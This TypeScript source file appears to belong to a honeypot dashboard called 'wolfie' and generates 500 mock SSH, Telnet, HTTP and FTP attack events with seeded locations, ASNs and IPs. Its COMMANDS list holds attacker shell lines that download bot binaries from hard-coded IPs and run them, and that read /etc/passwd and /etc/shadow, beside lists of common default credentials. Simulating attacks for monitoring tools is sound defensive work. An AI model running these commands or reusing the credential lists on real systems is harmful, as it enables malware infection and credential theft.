/* ========================================
   wolfie — Mock Data Generator
   500 realistic honeypot attack events
   ======================================== */

import {
  Attack,
  Protocol,
  EventType,
} from './types';

// ── Seed data ──────────────────────────────────────────

const COUNTRIES: { country: string; flag: string; weight: number; cities: string[] }[] = [
  { country: 'China', flag: '🇨🇳', weight: 25, cities: ['Beijing', 'Shanghai', 'Shenzhen', 'Guangzhou', 'Hangzhou'] },
  { country: 'Russia', flag: '🇷🇺', weight: 18, cities: ['Moscow', 'Saint Petersburg', 'Novosibirsk', 'Kazan'] },
  { country: 'United States', flag: '🇺🇸', weight: 12, cities: ['New York', 'Los Angeles', 'Dallas', 'Chicago', 'Miami'] },
  { country: 'Germany', flag: '🇩🇪', weight: 8, cities: ['Frankfurt', 'Berlin', 'Munich', 'Hamburg'] },
  { country: 'Netherlands', flag: '🇳🇱', weight: 7, cities: ['Amsterdam', 'Rotterdam', 'The Hague'] },
  { country: 'Vietnam', flag: '🇻🇳', weight: 7, cities: ['Hanoi', 'Ho Chi Minh City', 'Da Nang'] },
  { country: 'Brazil', flag: '🇧🇷', weight: 6, cities: ['São Paulo', 'Rio de Janeiro', 'Brasília'] },
  { country: 'Singapore', flag: '🇸🇬', weight: 5, cities: ['Singapore'] },
  { country: 'India', flag: '🇮🇳', weight: 7, cities: ['Mumbai', 'Delhi', 'Bangalore', 'Chennai'] },
  { country: 'Romania', flag: '🇷🇴', weight: 5, cities: ['Bucharest', 'Cluj-Napoca', 'Timișoara'] },
];

const ASN_POOL = [
  'AS4134 CHINANET', 'AS4837 CNCGROUP', 'AS12389 ROSTELECOM', 'AS16509 AMAZON',
  'AS13335 CLOUDFLARE', 'AS14061 DIGITALOCEAN', 'AS24940 HETZNER', 'AS16276 OVH',
  'AS45899 VNPT', 'AS9009 M247', 'AS8075 MICROSOFT', 'AS15169 GOOGLE',
  'AS206264 AMARUTU', 'AS398101 GOHOST', 'AS56540 VOLTERRA',
];

const USERNAMES = [
  'root', 'admin', 'ubuntu', 'pi', 'user', 'test', 'oracle',
  'postgres', 'deploy', 'git', 'mysql', 'guest',
];

const PASSWORDS = [
  '123456', 'password', 'admin', 'root', '1234', 'letmein',
  'qwerty', 'pass', '111111', 'admin123', 'root123', 'toor',
];

const COMMANDS = [
  'uname -a',
  'cat /etc/passwd',
  'wget http://45.148.10.91/bins.sh',
  'curl http://185.196.8.71/bot.x86 -O',
  'id',
  'whoami',
  'cat /proc/cpuinfo',
  'free -m',
  'ls -la /tmp',
  'cd /tmp && wget http://91.92.240.36/x86',
  '/bin/busybox ECCHI',
  'chmod 777 /tmp/bot; /tmp/bot',
  'nproc',
  'cat /etc/shadow',
  'ps aux',
  'ifconfig',
  'history',
  'crontab -l',
  'curl ifconfig.me',
  'dd if=/dev/urandom of=/dev/null bs=1M count=10',
];

// ── Helpers ────────────────────────────────────────────

function seededRandom(seed: number): () => number {
  let s = seed;
  return () => {
    s = (s * 16807 + 0) % 2147483647;
    return (s - 1) / 2147483646;
  };
}

const rand = seededRandom(42);

function pick<T>(arr: T[]): T {
  return arr[Math.floor(rand() * arr.length)];
}

function weightedPick<T extends { weight: number }>(items: T[]): T {
  const total = items.reduce((s, i) => s + i.weight, 0);
  let r = rand() * total;
  for (const item of items) {
    r -= item.weight;
    if (r <= 0) return item;
  }
  return items[items.length - 1];
}

function randomIP(): string {
  // Avoid reserved ranges
  const first = [1, 2, 5, 14, 23, 27, 31, 36, 37, 39, 41, 42, 43, 45, 46,
    49, 51, 58, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73,
    74, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92,
    93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 109, 110, 111,
    112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125,
    128, 129, 130, 131, 132, 133, 134, 136, 137, 138, 139, 140, 141, 142,
    143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156,
    157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170,
    171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184,
    185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198,
    199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212,
    213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223];
  return `${pick(first)}.${Math.floor(rand() * 256)}.${Math.floor(rand() * 256)}.${Math.floor(rand() * 256)}`;
}

function generateSessionId(): string {
  const hex = '0123456789abcdef';
  let id = '';
  for (let i = 0; i < 16; i++) id += hex[Math.floor(rand() * 16)];
  return id;
}

// ── Event type distribution ────────────────────────────
function pickEventType(): EventType {
  const r = rand();
  if (r < 0.80) return 'login.failed';
  if (r < 0.82) return 'login.success';
  if (r < 0.97) return 'command.input';
  return 'session.closed';
}

// ── Protocol distribution ──────────────────────────────
function pickProtocol(): Protocol {
  const r = rand();
  if (r < 0.70) return 'ssh';
  if (r < 0.85) return 'telnet';
  if (r < 0.95) return 'http';
  return 'ftp';
}

function protocolPort(p: Protocol): number {
  switch (p) {
    case 'ssh': return 22;
    case 'telnet': return 23;
    case 'http': return 80;
    case 'ftp': return 21;
  }
}

// ── Generate timestamps (more attacks at night UTC) ────
function generateTimestamps(count: number): Date[] {
  const now = new Date();
  const dayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
  const timestamps: Date[] = [];

  for (let i = 0; i < count; i++) {
    // Weight toward night hours (00:00-08:00 UTC)
    let hour: number;
    const r = rand();
    if (r < 0.5) {
      // 50% chance: night hours (0-8)
      hour = Math.floor(rand() * 8);
    } else if (r < 0.8) {
      // 30% chance: evening (18-24)
      hour = 18 + Math.floor(rand() * 6);
    } else {
      // 20% chance: daytime (8-18)
      hour = 8 + Math.floor(rand() * 10);
    }
    const minute = Math.floor(rand() * 60);
    const second = Math.floor(rand() * 60);
    const ms = Math.floor(rand() * 1000);

    const ts = new Date(dayAgo);
    ts.setUTCHours(hour, minute, second, ms);

    // If the generated time is in the future, pull it back
    if (ts.getTime() > now.getTime()) {
      ts.setTime(now.getTime() - Math.floor(rand() * 3600000));
    }

    timestamps.push(ts);
  }

  // Sort newest first
  timestamps.sort((a, b) => b.getTime() - a.getTime());
  return timestamps;
}

// ── Create a pool of recurring IPs (some attackers hit repeatedly) ──
function generateIPPool(): { ip: string; country: string; city: string; flag: string; asn: string }[] {
  const pool: { ip: string; country: string; city: string; flag: string; asn: string }[] = [];
  // 30 unique IPs, some from same countries
  for (let i = 0; i < 30; i++) {
    const loc = weightedPick(COUNTRIES);
    pool.push({
      ip: randomIP(),
      country: loc.country,
      city: pick(loc.cities),
      flag: loc.flag,
      asn: pick(ASN_POOL),
    });
  }
  return pool;
}

// ── Main generator ─────────────────────────────────────

function generateMockAttacks(): Attack[] {
  const timestamps = generateTimestamps(500);
  const ipPool = generateIPPool();
  const attacks: Attack[] = [];

  for (let i = 0; i < 500; i++) {
    const eventType = pickEventType();
    const protocol = pickProtocol();
    const source = pick(ipPool);

    const attack: Attack = {
      id: 500 - i,
      ts: timestamps[i].toISOString(),
      src_ip: source.ip,
      src_port: 30000 + Math.floor(rand() * 35535),
      dst_port: protocolPort(protocol),
      protocol,
      event_type: eventType,
      username: eventType !== 'session.closed' ? pick(USERNAMES) : null,
      password: eventType === 'login.failed' || eventType === 'login.success'
        ? pick(PASSWORDS) : null,
      command: eventType === 'command.input' ? pick(COMMANDS) : null,
      country: source.country,
      city: source.city,
      asn: source.asn,
      session_id: generateSessionId(),
    };

    attacks.push(attack);
  }

  return attacks;
}

// Export the generated data (generated once, cached in module)
export const mockAttacks: Attack[] = generateMockAttacks();

// Export country metadata for flag lookups
export const COUNTRY_FLAGS: Record<string, string> = Object.fromEntries(
  COUNTRIES.map(c => [c.country, c.flag])
);
